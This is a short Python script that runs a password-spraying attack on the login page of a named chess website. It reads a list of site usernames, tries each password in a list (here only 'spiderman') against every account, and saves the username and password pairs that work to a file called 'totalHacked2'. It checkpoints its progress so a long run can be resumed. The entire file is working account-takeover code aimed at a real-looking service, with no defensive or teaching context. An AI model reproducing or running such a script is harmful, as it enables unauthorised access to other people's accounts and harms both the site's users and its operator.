import requests

def getName(user):
    return []

def hack(user):
     global passwords, lastName, n
#     name = getName(user)
#     if (not name): return
     passwords2 = passwords.copy()
#     passwords2 = passwords2 + name
     for password in passwords2:
         if (len(password) < 4): continue
#         print(user, password)
         r = requests.post(
             "http://ru.chesster.ru/login",
             {"username" : user, "password" : password, "_referrer" : "http://en.chesster.ru/login"}
         )
         if (r.status_code == 200):
            myfile = open("totalHacked2", "a")
            myfile.write(user + ' ' + password + '\n')
            myfile.close()
            break
     return 1


n = 0

myfile = open("allchessterusers2", "r")
mylist = myfile.read().split("\n")
myfile.close()

passwords = ['spiderman']
user_count = 0

for user in mylist:
    if (mylist.index(user) < user_count): continue
    hack(user)
    user_count = user_count + 1
    if (user_count % 1 == 0):
       myfile = open("user_count", "w")
       myfile.write(str(user_count))
       myfile.close()
